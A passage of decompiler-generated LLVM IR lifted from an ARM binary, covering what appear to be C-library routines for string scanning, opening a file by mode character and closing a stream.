  %v0_142f4 = load i32, i32* @sl, align 4
  store i32 %v0_142f4, i32* @r0, align 4
  %v2_142f8 = call i32 @function_1585c(i32 %v0_142f4, i32 %v4_142f0)
  store i32 %v2_142f8, i32* %r0.global-to-local, align 4
  %v2_142fc = icmp eq i32 %v2_142f8, 0
  store i1 %v2_142fc, i1* %cpsr_z.global-to-local, align 1
  %v0_14304.pre = load i32, i32* @r4, align 4
  br i1 %v2_142fc, label %dec_label_pc_14304, label %dec_label_pc_142ec

dec_label_pc_14304:                               ; preds = %dec_label_pc_142f0, %dec_label_pc_142cc, %dec_label_pc_142ac
  %v3_14310 = phi i32 [ %v5_142d4, %dec_label_pc_142cc ], [ %v2_142c4, %dec_label_pc_142ac ], [ %v0_14304.pre, %dec_label_pc_142f0 ]
  %v1_14304 = inttoptr i32 %v3_14310 to i8*
  %v2_14304 = load i8, i8* %v1_14304, align 1
  %v3_14304 = zext i8 %v2_14304 to i32
  store i32 %v3_14304, i32* %r2.global-to-local, align 4
  %v0_14308 = load i32, i32* @r7, align 4
  %v1_14308 = inttoptr i32 %v0_14308 to i8*
  %v2_14308 = load i8, i8* %v1_14308, align 1
  %v3_14308 = zext i8 %v2_14308 to i32
  store i32 %v3_14308, i32* %r3.global-to-local, align 4
  %v9_1430c = icmp eq i8 %v2_14308, %v2_14304
  store i1 %v9_1430c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1430c, label %bb71, label %dec_label_pc_14318

bb71:                                             ; preds = %dec_label_pc_14304
  %v1_14310 = load i32, i32* @fp, align 4
  %v2_14310 = trunc i32 %v1_14310 to i8
  store i8 %v2_14310, i8* %v1_14304, align 1
  %v0_14314.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14314.pr, label %bb73, label %.dec_label_pc_14318_crit_edge

.dec_label_pc_14318_crit_edge:                    ; preds = %bb71
  %v0_14318.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %.dec_label_pc_14318_crit_edge, %dec_label_pc_14304
  %v0_14318 = phi i32 [ %v0_14318.pre, %.dec_label_pc_14318_crit_edge ], [ %v3_14304, %dec_label_pc_14304 ]
  %v2_14318 = icmp eq i32 %v0_14318, 0
  store i1 %v2_14318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14318, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14318
  %v1_1431c = load i32, i32* @fp, align 4
  %v2_1431c = trunc i32 %v1_1431c to i8
  %v3_1431c = load i32, i32* @r4, align 4
  %v4_1431c = inttoptr i32 %v3_1431c to i8*
  store i8 %v2_1431c, i8* %v4_1431c, align 1
  %v5_1431c = load i32, i32* @r4, align 4
  %v6_1431c = add i32 %v5_1431c, 1
  store i32 %v6_1431c, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_14318, %bb72
  %v2_14320 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14320, i32* %r3.global-to-local, align 4
  %v2_14324 = icmp eq i32 %v2_14320, 0
  store i1 %v2_14324, i1* %cpsr_z.global-to-local, align 1
  %v0_14340.pre = load i32, i32* @r4, align 4
  br i1 %v2_14324, label %dec_label_pc_1433c, label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %bb73
  store i32 %v0_14340.pre, i32* @r0, align 4
  %v0_14330 = load i32, i32* @sl, align 4
  %v2_14334 = inttoptr i32 %v0_14340.pre to i8*
  %v3_14334 = call i32 @function_156d4(i8* %v2_14334, i32 %v0_14330)
  store i32 %v3_14334, i32* %r0.global-to-local, align 4
  %v0_14338 = load i32, i32* @r4, align 4
  %v2_14338 = add i32 %v0_14338, %v3_14334
  store i32 %v2_14338, i32* @r4, align 4
  br label %dec_label_pc_1433c

dec_label_pc_1433c:                               ; preds = %bb73, %dec_label_pc_1432c
  %v0_14340 = phi i32 [ %v2_14338, %dec_label_pc_1432c ], [ %v0_14340.pre, %bb73 ]
  %v0_1433c = load i32, i32* @r6, align 4
  %v1_1433c = add i32 %v0_1433c, 1
  store i32 %v1_1433c, i32* @r6, align 4
  %v1_14340 = inttoptr i32 %v0_14340 to i8*
  %v2_14340 = load i8, i8* %v1_14340, align 1
  %v3_14340 = zext i8 %v2_14340 to i32
  store i32 %v3_14340, i32* %r2.global-to-local, align 4
  %v2_14344 = icmp eq i8 %v2_14340, 0
  store i1 %v2_14344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14344, label %dec_label_pc_1435c, label %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge

dec_label_pc_1433c.dec_label_pc_1434c_crit_edge:  ; preds = %dec_label_pc_1433c
  %v0_1434c.pre = load i32, i32* @r7, align 4
  %v1_1434c = inttoptr i32 %v0_1434c.pre to i8*
  %v2_1434c = load i8, i8* %v1_1434c, align 1
  %v3_1434c = zext i8 %v2_1434c to i32
  store i32 %v3_1434c, i32* %r3.global-to-local, align 4
  %v9_14350 = icmp eq i8 %v2_1434c, %v2_14340
  store i1 %v9_14350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14350, label %dec_label_pc_1435c, label %bb74

bb74:                                             ; preds = %dec_label_pc_1434c.preheader, %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge
  %v2_1429888 = phi i32 [ %v1_1433c, %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge ], [ %v1_1427c, %dec_label_pc_1434c.preheader ]
  %v0_1429887 = phi i32 [ %v0_14340, %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge ], [ %v0_1434013, %dec_label_pc_1434c.preheader ]
  %v2_14354 = load i32, i32* @sb, align 4
  %v3_14354 = sub i32 %v2_1429888, %v2_14354
  %v5_14354 = xor i32 %v2_14354, %v2_1429888
  %v6_14354 = xor i32 %v3_14354, %v2_1429888
  %v7_14354 = and i32 %v6_14354, %v5_14354
  %v8_14354 = icmp slt i32 %v7_14354, 0
  %v9_14354 = icmp slt i32 %v3_14354, 0
  %v10_14354 = icmp eq i32 %v2_1429888, %v2_14354
  store i1 %v10_14354, i1* %cpsr_z.global-to-local, align 1
  %v2_14358 = xor i1 %v9_14354, %v8_14354
  br i1 %v2_14358, label %dec_label_pc_14288, label %dec_label_pc_1435c

dec_label_pc_1435c:                               ; preds = %dec_label_pc_1434c.preheader, %bb74, %dec_label_pc_1433c, %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge, %dec_label_pc_14340.preheader
  %v0_14360 = phi i32 [ %v1_1427c, %dec_label_pc_14340.preheader ], [ %v1_1427c, %dec_label_pc_1434c.preheader ], [ %v2_1429888, %bb74 ], [ %v1_1433c, %dec_label_pc_1433c ], [ %v1_1433c, %dec_label_pc_1433c.dec_label_pc_1434c_crit_edge ]
  store i32 %v3_14080, i32* %r2.global-to-local, align 4
  %v9_14360 = icmp eq i32 %v0_14360, %v3_14080
  store i1 %v9_14360, i1* %cpsr_z.global-to-local, align 1
  %v6_14364 = icmp slt i32 %v0_14360, %v3_14080
  br i1 %v6_14364, label %dec_label_pc_14368, label %dec_label_pc_14374

dec_label_pc_14368:                               ; preds = %dec_label_pc_1435c
  %v0_14368 = load i32, i32* @r8, align 4
  %v1_14368 = and i32 %v0_14368, 1048576
  %v2_14368 = icmp eq i32 %v1_14368, 0
  store i1 %v2_14368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14368, label %dec_label_pc_140c0.backedge, label %dec_label_pc_14370

dec_label_pc_14370:                               ; preds = %dec_label_pc_14368, %dec_label_pc_14228, %.thread, %dec_label_pc_1405c
  br label %dec_label_pc_14374

dec_label_pc_14374:                               ; preds = %dec_label_pc_1435c, %dec_label_pc_14144, %dec_label_pc_14370
  %v0_14374 = phi i32 [ %v0_14154, %dec_label_pc_14144 ], [ 0, %dec_label_pc_14370 ], [ %v0_14360, %dec_label_pc_1435c ]
  store i32 %v0_14374, i32* %r0.global-to-local, align 4
  store i32 %v3_1405c, i32* @r4, align 4
  store i32 %v6_1405c, i32* @r5, align 4
  store i32 %v9_1405c, i32* @r6, align 4
  store i32 %v12_1405c, i32* @r7, align 4
  store i32 %v15_1405c, i32* @r8, align 4
  store i32 %v18_1405c, i32* @sb, align 4
  store i32 %v21_1405c, i32* @sl, align 4
  store i32 %v24_1405c, i32* @fp, align 4
  ret i32 %v0_14374

; uselistorder directives
  uselistorder i32 %v0_14374, { 1, 0 }
  uselistorder i32 %v0_14360, { 0, 2, 1 }
  uselistorder i32 %v3_14354, { 1, 0 }
  uselistorder i32 %v2_14354, { 1, 0, 2 }
  uselistorder i32 %v2_1429888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_14350, { 1, 0 }
  uselistorder i32 %v0_14340.pre, { 0, 2, 1 }
  uselistorder i32 %v5_142d4, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1435086, { 1, 0 }
  uselistorder i1 %v9_14278, { 1, 0 }
  uselistorder i32 %v3_14250, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14228, { 1, 0 }
  uselistorder i1 %v8_14220, { 1, 0 }
  uselistorder i32 %v3_141f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_141e0, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_141c8, { 1, 0, 2 }
  uselistorder i32 %v1_141b8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_141a4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1419c, { 1, 0 }
  uselistorder i32 %v1_14188, { 1, 0 }
  uselistorder i32 %v1_14184, { 1, 0 }
  uselistorder i32 %v1_14144, { 2, 0, 1 }
  uselistorder i32 %v0_1412c, { 1, 0 }
  uselistorder i32 %v1_1411c, { 0, 2, 1 }
  uselistorder i1 %v2_1424c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_140a8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1409c, { 2, 1, 0 }
  uselistorder i32 %v3_14084, { 1, 0 }
  uselistorder i32 %v3_14080, { 2, 1, 0 }
  uselistorder i32 %v1_14078, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 33, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 92, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @function_15610, { 1, 0 }
  uselistorder i32 262144, { 1, 2, 0 }
  uselistorder i32* @sl, { 7, 8, 9, 10, 11, 12, 13, 40, 0, 41, 42, 14, 15, 102, 103, 104, 105, 106, 107, 108, 109, 110, 1, 111, 112, 113, 114, 115, 116, 118, 2, 117, 120, 119, 121, 122, 123, 124, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 5, 64, 65, 66, 6, 67, 68, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 3, 86, 87, 88, 89, 4, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 125, 126, 127, 128, 69, 70, 71, 72, 73 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_14374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1435c, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1433c, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142f0, { 1, 0 }
  uselistorder label %dec_label_pc_140c0.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14268, { 1, 0 }
  uselistorder label %dec_label_pc_14228, { 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_141e0, { 1, 0 }
  uselistorder label %dec_label_pc_14114, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_14384(i32* %arg1) local_unnamed_addr {
dec_label_pc_14384:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_14388 = icmp eq i32* %arg1, null
  br i1 %v2_14388, label %dec_label_pc_143b0, label %dec_label_pc_14390

dec_label_pc_14390:                               ; preds = %dec_label_pc_14384
  %v2_14390 = load i32, i32* %arg1, align 4
  %v1_14394 = inttoptr i32 %v2_14390 to i16*
  %v2_14394 = call i32 @function_14400(i16* %v1_14394)
  %v0_14398 = load i32, i32* @r4, align 4
  %v1_14398 = add i32 %v0_14398, 20
  %v2_14398 = inttoptr i32 %v1_14398 to i32*
  %v3_14398 = load i32, i32* %v2_14398, align 4
  %v2_1439c = icmp eq i32 %v3_14398, 0
  br i1 %v2_1439c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_14390
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_14390, %bb
  store i32 82856, i32* @lr, align 4
  %v1_143a4 = xor i1 %v2_1439c, true
  call void @__pseudo_cond_branch(i1 %v1_143a4, i32 ptrtoint (i32* @global_var_12670.21 to i32))
  %v0_143a8 = load i32, i32* @r4, align 4
  store i32 %v0_143a8, i32* @r0, align 4
  %v0_143ac = call i32 @function_12670()
  br label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %dec_label_pc_14384, %bb6
  %v1_143b4 = phi i32 [ 0, %dec_label_pc_14384 ], [ %v0_143ac, %bb6 ]
  ret i32 %v1_143b4

; uselistorder directives
  uselistorder i32* null, { 0, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 3, 19, 4, 20, 21, 22 }
  uselistorder label %dec_label_pc_143b0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_143b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_143b8:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143c4 = load i32, i32* @r4, align 4
  store i32 %v3_143c4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_16164.452 to i32), i32* @r1, align 4
  %v0_143cc = call i32 @function_145b4()
  store i32 %v0_143cc, i32* %r0.global-to-local, align 4
  store i32 %v0_143cc, i32* @r4, align 4
  %v2_143d0 = icmp eq i32 %v0_143cc, 0
  br i1 %v2_143d0, label %bb, label %dec_label_pc_143dc

bb:                                               ; preds = %dec_label_pc_143b8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143b8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_143e4 = call i32 @function_11f24(i32 1, i32 24)
  store i32 %v2_143e4, i32* %r0.global-to-local, align 4
  %v2_143e8 = icmp eq i32 %v2_143e4, 0
  br i1 %v2_143e8, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_143dc
  %v1_143ec = load i32, i32* @r4, align 4
  %v3_143ec = inttoptr i32 %v2_143e4 to i32*
  store i32 %v1_143ec, i32* %v3_143ec, align 4
  %v1_143f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_143dc, %bb4
  %v1_143f4 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_143dc ], [ %v1_143f4.pre, %bb4 ]
  %v2_143f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143f0, i32* @r4, align 4
  ret i32 %v1_143f4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_11f24, { 40, 11, 39, 38, 37, 36, 35, 20, 19, 34, 33, 29, 28, 27, 26, 25, 24, 23, 22, 21, 9, 18, 17, 16, 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 1, 0, 10, 32, 31, 30 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_14400(i16* %arg1) local_unnamed_addr {
dec_label_pc_14400:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14400 = load i32, i32* @r4, align 4
  store i32 %v3_14400, i32* %stack_var_-36, align 4
  %v6_14400 = load i32, i32* @r5, align 4
  %v9_14400 = load i32, i32* @r6, align 4
  %v12_14400 = load i32, i32* @r7, align 4
  %v2_14404 = add i32 %tmp, 52
  %v3_14404 = inttoptr i32 %v2_14404 to i32*
  %v4_14404 = load i32, i32* %v3_14404, align 4
  %v1_1440c = sub i32 1, %v4_14404
  %v2_1440c = icmp ult i32 %v4_14404, 2
  br i1 %v2_1440c, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14400
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14400, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_1440c, %dec_label_pc_14400 ]
  %v0_14414 = phi i32 [ 0, %bb ], [ %v1_1440c, %dec_label_pc_14400 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_14414 = icmp eq i32 %v0_14414, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 124088, i32* @r6, align 4
  br i1 %v2_14414, label %dec_label_pc_14460, label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %bb18
  %v4_14440 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_14440)
  %v0_14454 = load i32, i32* @r6, align 4
  %v2_14454 = add i32 %v0_14454, 16
  %v3_14454 = inttoptr i32 %v2_14454 to i32*
  %v4_14454 = load i32, i32* %v3_14454, align 4
  call void @__pseudo_branch(i32 %v4_14454)
  %v0_14460.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %bb18, %dec_label_pc_14428
  %v1_14468 = phi i32 [ %tmp, %bb18 ], [ %v0_14460.pre, %dec_label_pc_14428 ]
  %v1_14460 = inttoptr i32 %v1_14468 to i16*
  %v2_14460 = load i16, i16* %v1_14460, align 2
  %v3_14460 = zext i16 %v2_14460 to i32
  %v1_14464 = and i32 %v3_14460, 64
  %v2_14464 = icmp eq i32 %v1_14464, 0
  br i1 %v2_14464, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14460
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14460, %bb19
  %storemerge26 = phi i32 [ %v1_14468, %bb19 ], [ %v1_14464, %dec_label_pc_14460 ]
  %v1_1446c = xor i1 %v2_14464, true
  call void @__pseudo_cond_branch(i1 %v1_1446c, i32 ptrtoint (i32* @global_var_14d9c.457 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_14474 = load i32, i32* @r5, align 4
  %v1_14474 = add i32 %v0_14474, 4
  %v2_14474 = inttoptr i32 %v1_14474 to i32*
  %v3_14474 = load i32, i32* %v2_14474, align 4
  %v1_14478 = call i32 @function_10be0(i32 %v3_14474)
  %v0_14480 = load i32, i32* @r6, align 4
  %v2_1448c = add i32 %v0_14480, 108
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  %v4_1448c = load i32, i32* %v3_1448c, align 4
  store i32 %v4_1448c, i32* @r7, align 4
  %v1_14494 = load i32, i32* @r5, align 4
  %v2_14494 = add i32 %v1_14494, 4
  %v3_14494 = inttoptr i32 %v2_14494 to i32*
  store i32 -1, i32* %v3_14494, align 4
  %v0_1449c = load i32, i32* @r6, align 4
  %v2_1449c = add i32 %v0_1449c, 72
  %v3_1449c = inttoptr i32 %v2_1449c to i32*
  %v4_1449c = load i32, i32* %v3_1449c, align 4
  %v1_144a4 = icmp slt i32 %v1_14478, 0
  store i32 %v4_1449c, i32* %stack_var_-80, align 4
  br i1 %v1_144a4, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_1449c)
  %v0_144cc = load i32, i32* @r6, align 4
  %v2_144cc = add i32 %v0_144cc, 16
  %v3_144cc = inttoptr i32 %v2_144cc to i32*
  %v4_144cc = load i32, i32* %v3_144cc, align 4
  call void @__pseudo_branch(i32 %v4_144cc)
  %v0_144dc = load i32, i32* @r6, align 4
  %v2_144dc = add i32 %v0_144dc, 12
  %v3_144dc = inttoptr i32 %v2_144dc to i32*
  %v4_144dc = load i32, i32* %v3_144dc, align 4
  %v1_144e0 = inttoptr i32 %v4_144dc to i32*
  %v2_144e0 = load i32, i32* %v1_144e0, align 4
  %v1_144e8 = add i32 %v2_144e0, 1
  %v2_144ec = add i32 %v0_144dc, 24
  %v3_144ec = inttoptr i32 %v2_144ec to i32*
  %v4_144ec = load i32, i32* %v3_144ec, align 4
  store i32 %v4_144ec, i32* @r4, align 4
  store i32 %v1_144e8, i32* %v1_144e0, align 4
  call void @__pseudo_branch(i32 %v4_144ec)
  %v0_14504 = load i32, i32* @r5, align 4
  %v1_14504 = inttoptr i32 %v0_14504 to i16*
  %v2_14504 = load i16, i16* %v1_14504, align 2
  %v1_14508 = and i16 %v2_14504, 24576
  %v1_1450c = or i16 %v1_14508, 48
  %v0_14510 = load i32, i32* %sb.global-to-local, align 4
  %v2_14510 = icmp eq i32 %v0_14510, 0
  store i16 %v1_1450c, i16* %v1_14504, align 2
  br i1 %v2_14510, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_14524 = xor i1 %v2_14510, true
  call void @__pseudo_cond_branch(i1 %v2_14524, i32 %v4_144ec)
  %v0_14528 = load i32, i32* @r5, align 4
  %v1_14528 = inttoptr i32 %v0_14528 to i16*
  %v2_14528 = load i16, i16* %v1_14528, align 2
  %v1_1452c = and i16 %v2_14528, 16384
  %v2_1452c = icmp eq i16 %v1_1452c, 0
  br i1 %v2_1452c, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_14534 = xor i1 %v2_1452c, true
  call void @__pseudo_cond_branch(i1 %v1_14534, i32 ptrtoint (i32* @global_var_12670.21 to i32))
  %v2_14540 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_14540)
  call void @__pseudo_branch(i32 %v4_144cc)
  %v0_14560 = load i32, i32* @r6, align 4
  %v2_14560 = add i32 %v0_14560, 48
  %v3_14560 = inttoptr i32 %v2_14560 to i32*
  %v4_14560 = load i32, i32* %v3_14560, align 4
  %v1_14564 = inttoptr i32 %v4_14560 to i32*
  %v2_14564 = load i32, i32* %v1_14564, align 4
  %v1_14568 = add i32 %v2_14564, 1
  store i32 %v1_14568, i32* %v1_14564, align 4
  call void @__pseudo_branch(i32 %v4_144ec)
  %v0_14580 = call i32 @function_14c14()
  %v0_14584 = load i32, i32* %sl.global-to-local, align 4
  %v2_1458c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1458c, i32* @r4, align 4
  store i32 %v6_14400, i32* @r5, align 4
  store i32 %v9_14400, i32* @r6, align 4
  store i32 %v12_14400, i32* @r7, align 4
  ret i32 %v0_14584

; uselistorder directives
  uselistorder i1 %v2_1452c, { 1, 0 }
  uselistorder i32 %v4_144ec, { 2, 1, 0, 3 }
  uselistorder i32 %v4_14404, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_10be0, { 32, 28, 27, 26, 31, 25, 30, 29, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14460, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_14598(i32 %arg1) local_unnamed_addr {
dec_label_pc_14598:
  %v0_14598 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14598, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_14598
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14598, %bb
  %v10_145b0 = phi i32 [ %arg1, %dec_label_pc_14598 ], [ 0, %bb ]
  ret i32 %v10_145b0

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_145b4() local_unnamed_addr {
dec_label_pc_145b4:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_145c4 = call i32 @function_145d4()
  ret i32 %v0_145c4
}

define i32 @function_145d4() local_unnamed_addr {
dec_label_pc_145d4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_145d4 = load i32, i32* @r4, align 4
  store i32 %v3_145d4, i32* %stack_var_-36, align 4
  %v6_145d4 = load i32, i32* @r5, align 4
  %v9_145d4 = load i32, i32* @r6, align 4
  %v18_145d4 = load i32, i32* @sb, align 4
  %v24_145d4 = load i32, i32* @fp, align 4
  %v0_145d8 = load i32, i32* @r1, align 4
  %v1_145d8 = inttoptr i32 %v0_145d8 to i8*
  %v2_145d8 = load i8, i8* %v1_145d8, align 1
  %v3_145d8 = zext i8 %v2_145d8 to i32
  store i32 %v3_145d8, i32* @ip, align 4
  %v7_145e0 = icmp eq i8 %v2_145d8, 114
  store i32 124088, i32* @fp, align 4
  %v2_145e8 = ptrtoint i32* %stack_var_-72 to i32
  %v0_145ec = load i32, i32* @r0, align 4
  store i32 %v0_145ec, i32* @r6, align 4
  %v0_145f0 = load i32, i32* @r2, align 4
  store i32 %v0_145f0, i32* @sb, align 4
  %v0_145f4 = load i32, i32* @r3, align 4
  store i32 %v0_145f4, i32* @r5, align 4
  br i1 %v7_145e0, label %dec_label_pc_14640, label %dec_label_pc_145fc

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145d4
  %v7_145fc = icmp eq i8 %v2_145d8, 119
  br i1 %v7_145fc, label %bb, label %dec_label_pc_14608

bb:                                               ; preds = %dec_label_pc_145fc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_14644

dec_label_pc_14608:                               ; preds = %dec_label_pc_145fc
  %v7_14608 = icmp eq i8 %v2_145d8, 97
  br i1 %v7_14608, label %bb32, label %dec_label_pc_14614

bb32:                                             ; preds = %dec_label_pc_14608
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_14644

dec_label_pc_14614:                               ; preds = %dec_label_pc_14608, %dec_label_pc_146c8, %dec_label_pc_1469c
  %v0_14614 = call i32 @function_11008()
  store i32 %v0_14614, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1461c = load i32, i32* @sb, align 4
  %v2_1461c = icmp eq i32 %v0_1461c, 0
  %v2_14620 = inttoptr i32 %v0_14614 to i32*
  store i32 22, i32* %v2_14620, align 4
  br i1 %v2_1461c, label %dec_label_pc_14894, label %dec_label_pc_14628

dec_label_pc_14628:                               ; preds = %dec_label_pc_146ec._crit_edge, %dec_label_pc_14614
  %v0_14628 = load i32, i32* @sb, align 4
  %v1_14628 = inttoptr i32 %v0_14628 to i16*
  %v2_14628 = load i16, i16* %v1_14628, align 2
  %v3_14628 = zext i16 %v2_14628 to i32
  store i32 %v3_14628, i32* %r3.global-to-local, align 4
  %v1_1462c = and i32 %v3_14628, 8192
  %v2_1462c = icmp eq i32 %v1_1462c, 0
  br i1 %v2_1462c, label %dec_label_pc_14894, label %dec_label_pc_14634

dec_label_pc_14634:                               ; preds = %dec_label_pc_14628
  store i32 %v0_14628, i32* @r0, align 4
  %v0_14638 = call i32 @function_12670()
  store i32 %v0_14638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14894

dec_label_pc_14640:                               ; preds = %dec_label_pc_145d4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %bb, %bb32, %dec_label_pc_14640
  %v1_1465c = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_14640 ]
  %v1_14644 = add i32 %v0_145d8, 1
  %v2_14644 = inttoptr i32 %v1_14644 to i8*
  %v3_14644 = load i8, i8* %v2_14644, align 1
  %v7_14648 = icmp eq i8 %v3_14644, 98
  %v1_14644.v0_145d8 = select i1 %v7_14648, i32 %v1_14644, i32 %v0_145d8
  store i32 %v1_14644.v0_145d8, i32* %r3.global-to-local, align 4
  %v1_14654 = add i32 %v1_14644.v0_145d8, 1
